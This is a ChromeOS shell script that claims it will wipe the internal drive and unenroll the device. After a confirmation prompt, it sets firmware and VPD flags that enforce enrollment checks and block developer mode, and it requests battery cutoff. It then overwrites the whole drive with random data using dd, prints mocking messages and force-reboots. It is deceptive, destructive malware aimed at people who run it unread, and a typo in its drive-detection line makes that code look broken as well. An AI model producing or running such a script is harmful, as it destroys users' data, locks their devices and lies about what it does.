SCRIPT_DATE="[2025-10-22]"

fail() {
    printf "%b\n" "$*" >&2
    exit 1
}


get_fixed_dst_drive() {
	local dev
	if [ -z "${DEFAULT_ROOTDEV}" ]; then
		for dev in /sys/block/sd* /sys/block/mmcblk*; do
			if [ ! -d "${dev}" ] || [ "$(cat "${dev}/removable")" = 1 ] || [ "$(cat "${dev}/size")" -lt 2097152 ]; then
				continue
			fi
			if [ -f "${dev}/device/type" ]; then
				case "$(cat "${dev}/device/type")" in
				SD*)
					continue;
					;;
				esac
			fi
			DEFAULT_ROOTDEV="{$dev}"
		done
	fi
	if [ -z "${DEFAULT_ROOTDEV}" ]; then
		dev=""
	else
		dev="/dev/$(basename ${DEFAULT_ROOTDEV})"
		if [ ! -b "${dev}" ]; then
			dev=""
		fi
	fi
	echo "${dev}"
}

. /usr/sbin/write_gpt.sh
load_base_vars
CROS_DEV=$(get_fixed_dst_drive)

format_part_number() {
    echo -n "$1"
    echo "$1" | grep -q '[0-9]$' && echo -n p
    echo "$2"
}

[ -z "$CROS_DEV" ] && fail "No CrOS SSD found on device!"

echo "no name yet."
echo "script date: ${SCRIPT_DATE}"
echo ""
echo "This will destroy all data on ${CROS_DEV} and unenroll the device."

echo "Continue? (y/N)"
read -r action
case "$action" in
    [yY]) : ;;
    *) fail "Abort." ;;
esac

# if you are reading this then good job, you are not a skid. else you are downloading this off discord and pressed view full file.  In that case you are still a skid. 

crossystem battery_cutoff_request=1
vpd -i RW_VPD -s check_enrollment=1
vpd -i RW_VPD -s block_devmode=1
crossystem block_devmode=1
crossystem disable_dev_request=1

sleep 2

dd if=/dev/urandom of="${CROS_DEV}" bs=1M status=progress

if [ $? -eq 0 ]; then
    clear
    echo "That was a bad idea."
    sleep 2
    echo "You ran this without looking at what it does."
    sleep 1
    echo "have fun"
    reboot -f
else
    fail "Error."
fi
